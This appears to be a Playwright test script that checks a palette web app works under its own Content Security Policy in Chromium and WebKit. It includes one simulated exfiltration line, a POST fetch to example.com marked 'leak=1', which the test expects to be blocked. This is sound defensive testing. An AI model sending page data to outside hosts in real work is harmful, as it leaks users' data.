// Does the site work under its own Content Security Policy? (npm run csp)
// Serves the repo with _headers applied, or checks a live site: URL=https://palette.etarc.net/ npm run csp
// In Chromium and WebKit: deposit, colour count, REROLL, swap to archive, proof, plates, cover, CSS, gallery.
// Fails on any policy violation or page error, and if a request to another host gets through.
// Waits by polling page.evaluate, because waitForFunction needs eval, which the policy forbids.
const { chromium, webkit } = require('playwright');
const path = require('node:path');
const { start } = require('./serve');

const LIVE = process.env.URL;

async function until(page, fn, what, ms = 90000) {
    const end = Date.now() + ms;
    while (Date.now() < end) {
        if (await page.evaluate(fn)) return;
        await page.waitForTimeout(100);
    }
    throw new Error('timed out: ' + what);
}

async function run(browser, base, problems) {
    const ctx = await browser.newContext({ viewport: { width: 1400, height: 900 }, acceptDownloads: true });
    await ctx.addInitScript(() => {
        window.__violations = [];
        document.addEventListener('securitypolicyviolation', e => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
    });
    const page = await ctx.newPage();
    const errors = [];
    page.on('pageerror', e => errors.push(e.message));
    const response = await page.goto(base);
    if (!response.headers()['content-security-policy']) problems.push('no Content-Security-Policy header');

    const filed = () => until(page, () => document.getElementById('acc-status').textContent === 'FILED' && !isExtracting, 'filed');
    await page.click('.sample[data-name="NEON CITY"]');
    await filed();
    await until(page, () => !document.getElementById('proof-stage').classList.contains('empty'), 'proof');
    const checksum = await page.textContent('#acc-check');

    await page.evaluate(() => { const s = document.getElementById('k-slider'); s.value = 3; s.dispatchEvent(new Event('input', { bubbles: true })); s.dispatchEvent(new Event('change', { bubbles: true })); });
    await page.waitForTimeout(500);
    await until(page, () => !isExtracting, 'colour count');
    await page.click('#btn-reroll');
    await page.waitForTimeout(500);
    await until(page, () => !isExtracting, 'reroll');
    await page.setInputFiles('#file-input', path.join(__dirname, '..', 'public', 'samples', 'dog.jpg'));
    await page.waitForTimeout(500);
    await until(page, () => !isExtracting, 'file input');

    await page.locator('#proof-screen').scrollIntoViewIfNeeded();
    await page.click('#proof-eject');
    await page.waitForTimeout(800);
    await page.click('#proof-eject');

    const [cover] = await Promise.all([page.waitForEvent('download', { timeout: 20000 }), page.click('#btn-export-image')]);
    await page.evaluate(() => { document.getElementById('export-menu').open = true; });
    const [css] = await Promise.all([page.waitForEvent('download', { timeout: 20000 }), page.click('#btn-export-css')]);

    // The point of the policy: nothing can leave for another host
    const leak = await page.evaluate(async () => {
        try { await fetch('https://example.com/?leak=1', { method: 'POST', mode: 'no-cors', body: 'x' }); return 'fetch got through'; } catch { return null; }
    });
    if (leak) problems.push(leak);
    const violations = (await page.evaluate(() => window.__violations)).filter(v => !v.includes('example.com'));
    if (!(await page.evaluate(() => window.__violations)).some(v => v.includes('example.com'))) problems.push('the blocked request raised no violation');

    // The gallery isn't deployed, so it can only be checked locally.
    let galleryViolations = [];
    if (!LIVE) {
        await page.goto(new URL('regression/gallery.html', base).href);
        await page.waitForTimeout(4000);
        galleryViolations = await page.evaluate(() => window.__violations);
    }

    for (const v of [...violations, ...galleryViolations]) problems.push('violation: ' + v);
    for (const e of errors) problems.push('page error: ' + e);
    await ctx.close();
    return { checksum, cover: cover.suggestedFilename(), css: css.suggestedFilename() };
}

(async () => {
    const server = LIVE ? null : await start({ headers: true });
    const base = LIVE || server.url;
    let failed = 0;
    for (const [name, type] of [['chromium', chromium], ['webkit', webkit]]) {
        const browser = await type.launch(name === 'chromium' ? { args: ['--mute-audio'] } : {});
        const problems = [];
        let result = {};
        try { result = await run(browser, base, problems); } catch (e) { problems.push(e.message); }
        await browser.close();
        console.log(`${problems.length ? '✖' : '✔'} ${name} ${JSON.stringify(result)}`);
        for (const p of problems) console.log('    ' + p);
        failed += problems.length;
    }
    if (server) server.close();
    console.log(failed ? `${failed} problem(s)` : 'Policy holds, everything works.');
    process.exit(failed ? 1 : 0);
})();
